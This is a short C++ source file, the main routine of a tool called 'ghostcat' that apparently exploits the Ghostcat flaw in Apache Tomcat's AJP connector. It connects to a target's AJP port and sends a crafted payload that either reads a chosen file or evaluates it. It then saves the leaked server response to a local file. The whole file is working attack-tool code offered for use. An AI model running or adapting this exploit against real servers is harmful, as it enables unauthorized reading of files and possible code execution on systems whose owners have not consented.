#include "hdr.h"

int main(int argc, char* argv[]) {
    if (argc != 6) {
        cout << "Usage:" << endl << "ghostcat [target] [HTTP port] [AJP port] [file] [read/eval]" << endl;
        return 1;
    }

    SOCKET sock = connect_host(argv[1], argv[3]);

    if (sock == -1) {
        cout << "Error starting Winsock." << endl;
    }
    else if (sock == -2) {
        cout << "The target could not be found." << endl;
    }
    else if (sock == -3) {
        cout << "Error connecting to target" << endl;
    }
    else if (sock == -4) {
        cout << "Error connecting to target" << endl;
    }

    int mode = 0;
    if (string(argv[5]) == "eval") {
        mode = 1;
    }

    len_str payload = getPayload(argv[1], getIp(argv[1]), argv[2], argv[4], mode);
    send(sock, payload.c_str, payload.len, NULL);

    saveFile(sock);
    cout << "Saved leak to ghostcat.txt!" << endl;

    return 1;
}